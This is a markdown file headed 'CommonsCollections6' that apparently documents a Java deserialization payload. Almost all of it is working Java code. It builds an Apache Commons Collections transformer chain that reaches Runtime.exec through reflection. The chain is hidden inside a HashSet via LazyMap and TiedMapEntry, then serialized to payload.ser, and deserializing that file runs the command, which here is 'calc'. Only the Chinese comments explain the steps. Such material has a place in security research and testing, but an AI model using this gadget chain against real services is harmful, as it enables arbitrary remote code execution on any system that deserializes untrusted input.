# CommonsCollections6

PayLoad:

```java
import com.nqzero.permit.Permit;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6 {

    public static void main(String[] args) throws Exception {
        String command = "calc";
        final String[] execArgs = new String[] { command };
        final Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                new ConstantTransformer(1) };
        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        //创建一个factory为恶意ChainedTransformer对象的lazyMap类实例
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        //创建一个map为恶意lazyMap类实例，key为foo的TiedMapEntry类实例
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        //取出HashSet对象的成员变量map
        Permit.setAccessible(f);
        HashMap innimpl = (HashMap) f.get(map);
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }
        //取出HashMap对象的成员变量table
        Permit.setAccessible(f2);
        Object[] array = (Object[]) f2.get(innimpl);
        //取出table里面的第一个Entry
        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        //取出Entry对象重的key，并将它赋值为恶意的TiedMapEntry对象
        Permit.setAccessible(keyField);
        keyField.set(node, entry);
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(map);
        oos.flush();
        oos.close();
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object newObj = ois.readObject();
        ois.close();
    }
}

```



